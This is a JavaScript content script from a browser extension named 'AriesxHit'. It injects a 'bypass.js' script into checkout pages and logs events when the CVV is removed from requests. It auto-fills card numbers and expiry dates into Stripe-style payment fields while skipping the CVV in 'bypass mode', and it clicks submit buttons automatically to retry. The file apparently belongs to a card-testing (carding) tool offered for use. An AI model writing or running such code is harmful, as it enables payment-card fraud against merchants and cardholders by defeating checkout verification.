// ===================================
// FORM-INJECTOR.JS
// Injects bypass.js into page context
// Location: scripts/content/form-injector.js
// ===================================

(function() {
  'use strict';

  console.log('[AriesxHit] Form injector loaded');

  // ==================== INJECT BYPASS SCRIPT ====================

  function injectBypassScript() {
    const script = document.createElement('script');
    script.src = chrome.runtime.getURL('scripts/core/bypass.js');
    script.onload = function() {
      console.log('[AriesxHit] Bypass script injected');
      this.remove();
    };
    script.onerror = function() {
      console.error('[AriesxHit] Failed to inject bypass script');
      this.remove();
    };

    (document.head || document.documentElement).appendChild(script);
  }

  // Inject immediately
  injectBypassScript();

  // ==================== MESSAGE HANDLING ====================

  // Listen for messages from page context (bypass.js)
  window.addEventListener('message', (event) => {
    if (event.data?.source === 'ariesxhit-bypass') {
      
      // CVV was removed
      if (event.data.type === 'cvv_removed') {
        console.log('[AriesxHit] CVV removed:', event.data.url);
        
        // Notify background script
        chrome.runtime.sendMessage({
          type: 'BYPASS_EVENT',
          data: {
            url: event.data.url,
            method: event.data.method,
            count: event.data.count
          }
        }).catch(() => {
          // Extension context invalidated, ignore
        });
      }

      // Bypass state changed
      if (event.data.type === 'state_changed') {
        console.log('[AriesxHit] Bypass state:', event.data.active ? 'ACTIVE' : 'INACTIVE');
      }
    }
  });

  // Listen for messages from background script
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    
    // Toggle bypass state
    if (message.type === 'SET_BYPASS_STATE') {
      console.log('[AriesxHit] Setting bypass state:', message.active);
      
      // Send to page context (bypass.js)
      window.postMessage({
        source: 'ariesxhit-bypass-control',
        active: message.active
      }, '*');

      sendResponse({ success: true });
    }

    // Get bypass stats
    if (message.type === 'GET_BYPASS_STATS') {
      // Request stats from page context
      window.postMessage({
        source: 'ariesxhit-bypass-control',
        action: 'get_stats'
      }, '*');
      
      sendResponse({ success: true });
    }

    return true;
  });

  // ==================== AUTO-FILL FORMS ====================

  /**
   * Auto-fill card form with provided data
   */
  function autoFillCard(cardData) {
    console.log('[AriesxHit] Auto-filling card data');

    // Common Stripe field selectors
    const selectors = {
      cardNumber: [
        'input[name="cardnumber"]',
        'input[name="card_number"]',
        'input[placeholder*="Card number"]',
        'input[placeholder*="card number"]',
        '#card-number',
        '.card-number'
      ],
      expMonth: [
        'input[name="exp_month"]',
        'input[name="exp-month"]',
        'input[placeholder*="MM"]',
        'select[name="exp_month"]'
      ],
      expYear: [
        'input[name="exp_year"]',
        'input[name="exp-year"]',
        'input[placeholder*="YY"]',
        'select[name="exp_year"]'
      ],
      cvv: [
        'input[name="cvc"]',
        'input[name="cvv"]',
        'input[placeholder*="CVC"]',
        'input[placeholder*="CVV"]',
        '#cvc',
        '.cvc'
      ]
    };

    // Try to find and fill fields
    for (const selector of selectors.cardNumber) {
      const field = document.querySelector(selector);
      if (field) {
        setFieldValue(field, cardData.number);
        break;
      }
    }

    for (const selector of selectors.expMonth) {
      const field = document.querySelector(selector);
      if (field) {
        setFieldValue(field, cardData.month);
        break;
      }
    }

    for (const selector of selectors.expYear) {
      const field = document.querySelector(selector);
      if (field) {
        setFieldValue(field, cardData.year);
        break;
      }
    }

    // Only fill CVV if not in bypass mode
    if (!cardData.bypassMode) {
      for (const selector of selectors.cvv) {
        const field = document.querySelector(selector);
        if (field) {
          setFieldValue(field, cardData.cvv);
          break;
        }
      }
    }
  }

  /**
   * Set field value and trigger events
   */
  function setFieldValue(field, value) {
    if (!field) return;

    // Set value
    field.value = value;

    // Trigger events
    field.dispatchEvent(new Event('input', { bubbles: true }));
    field.dispatchEvent(new Event('change', { bubbles: true }));
    field.dispatchEvent(new Event('blur', { bubbles: true }));

    // For React/Vue
    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype,
      'value'
    ).set;
    nativeInputValueSetter.call(field, value);
    
    const event = new Event('input', { bubbles: true });
    field.dispatchEvent(event);
  }

  // Listen for auto-fill requests
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'AUTO_FILL_CARD') {
      autoFillCard(message.cardData);
      sendResponse({ success: true });
    }
  });

  // ==================== RETRY LOGIC ====================

  /**
   * Click submit button to retry
   */
  function clickSubmitButton(selector) {
    let button;

    if (selector) {
      // Try custom selector
      if (selector.startsWith('/')) {
        // XPath
        const result = document.evaluate(
          selector,
          document,
          null,
          XPathResult.FIRST_ORDERED_NODE_TYPE,
          null
        );
        button = result.singleNodeValue;
      } else {
        // CSS selector
        button = document.querySelector(selector);
      }
    }

    // Fallback to common selectors
    if (!button) {
      const commonSelectors = [
        '.SubmitButton',
        '.CheckoutButton',
        'button[type="submit"]',
        '[class*="submit"]',
        '[class*="Submit"]',
        '[id*="submit"]'
      ];

      for (const sel of commonSelectors) {
        button = document.querySelector(sel);
        if (button) break;
      }
    }

    if (button) {
      console.log('[AriesxHit] Clicking submit button');
      button.click();
      return true;
    } else {
      console.error('[AriesxHit] Submit button not found');
      return false;
    }
  }

  // Listen for retry requests
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'CLICK_SUBMIT') {
      const success = clickSubmitButton(message.selector);
      sendResponse({ success: success });
    }
  });

  console.log('[AriesxHit] Form injector ready');

})();